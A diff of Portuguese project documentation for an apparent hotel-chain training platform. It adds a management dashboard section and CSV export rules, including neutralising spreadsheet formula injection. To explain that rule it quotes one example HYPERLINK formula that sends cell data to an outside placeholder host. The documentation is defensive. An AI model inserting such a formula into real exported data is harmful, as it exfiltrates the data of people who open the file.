@@ -453,7 +453,7 @@ Quatro módulos concentram as decisões que mais lugares precisam respeitar:
 
 | Tela | Responde |
 | --- | --- |
-| **Relatórios** | Como vai cada curso e cada departamento — visão consolidada, em percentuais. |
+| **Painel gerencial** | Como está a rede, **qual hotel está pior** e se a coisa melhorou nos últimos 6 meses. |
 | **Conformidade** | Nome a nome: quem está em dia, atrasado, ou vence nos próximos 7 dias. É a pergunta que auditoria e RH fazem, e que a consolidação não responde. |
 | **Primeiro acesso** | A senha que eu entreguei virou acesso? Quem nunca entrou, quem entrou e parou, e quem sequer tem curso atribuído. |
 | **Relatório para auditoria** (PDF) | Por departamento e treinamento obrigatório: quem está regular, com o código de conferência de cada certificado. |
@@ -461,6 +461,62 @@ Quatro módulos concentram as decisões que mais lugares precisam respeitar:
 Conformidade considera **apenas matrículas obrigatórias**. Curso opcional não é
 dívida de ninguém, e misturá-lo inflaria as pendências até o relatório virar
 ruído.
+
+### Painel gerencial
+
+Da conta proprietária, em `/admin/relatorios`. Responde três perguntas, na
+ordem em que a direção as faz: **como estamos**, **onde está o problema** e
+**estamos melhorando**.
+
+Duas coisas que os relatórios antigos não davam:
+
+- **O recorte por hotel.** Numa rede de 25 casas, "Recepção" não é um lugar: a
+  recepção do Canela e a de Gramado são equipes diferentes, com gerentes
+  diferentes. Cortar só por departamento dilui a casa que está mal na média das
+  outras 24. A tabela vem ordenada **pelo pior**, porque é por ele que a
+  cobrança começa.
+- **A série no tempo.** Tudo era foto do instante, e "42 atrasados" não diz
+  nada sozinho: 42 vindo de 90 é uma equipe funcionando, 42 vindo de 10 é um
+  incêndio. As barras separam o que a plataforma entregou do que foi treinado
+  presencialmente — um mês inteiro presencial não é a plataforma funcionando.
+
+Um grupo **sem obrigação atribuída** aparece como *"sem obrigações"*, e não
+como 100%. Ele não está em dia: está sem medida, e exibir verde ali premiaria
+justamente a casa onde ninguém cadastrou nada.
+
+### Exportação em planilha (CSV)
+
+Botão nas telas de **Conformidade**, **Usuários** e **Documentos**, e os três no
+painel. Leva o filtro que está em tela — quem filtrou a Recepção do Canela baixa
+aquela equipe, não a rede —, e o filtro vai no nome do arquivo
+(`conformidade-canela-2026-09-12.csv`), porque três arquivos chamados
+`conformidade.csv` na pasta de downloads é como alguém anexa o recorte errado
+num e-mail para a auditoria.
+
+O PDF de auditoria continua existindo, e não é redundante: ele é o documento
+que se arquiva, fechado e com os códigos de conferência. O CSV é material de
+trabalho — ordenar, filtrar e cruzar com a escala. Entregar só o PDF obriga
+alguém a redigitar a lista numa planilha, que é como um relatório erra.
+
+Três decisões de formato, todas em `src/lib/csv.ts`:
+
+- **Ponto e vírgula, não vírgula.** O Excel usa o separador de lista do
+  sistema, e em português esse separador é `;`. Um arquivo com vírgula abre com
+  todas as colunas empilhadas numa só.
+- **BOM na frente.** Sem ele o Excel não assume UTF-8 e "Conceição" chega como
+  "ConceiÃ§Ã£o".
+- **Célula que começaria com `=`, `+`, `-` ou `@` recebe um apóstrofo.**
+  Planilha não é texto: é um programa. Um nome cadastrado como
+  `=HYPERLINK("http://fora/?x"&A1;"Clique")` — plausível aqui, porque nomes
+  chegam pela sincronização com a intranet, que é um banco que esta plataforma
+  não controla — vira um link que carrega a planilha para fora quando alguém
+  clica. O apóstrofo faz o Excel tratar a célula como texto; ele não aparece na
+  tela nem ao copiar.
+
+A exportação **recusa** acima de 20 mil linhas em vez de cortar. Entregar as
+primeiras 20 mil de uma folha de conformidade seria pior do que não entregar:
+o arquivo abriria, pareceria completo, e quem o levasse à auditoria estaria
+afirmando que a rede tem menos pendências do que tem.
 
 ### Primeiro acesso
 
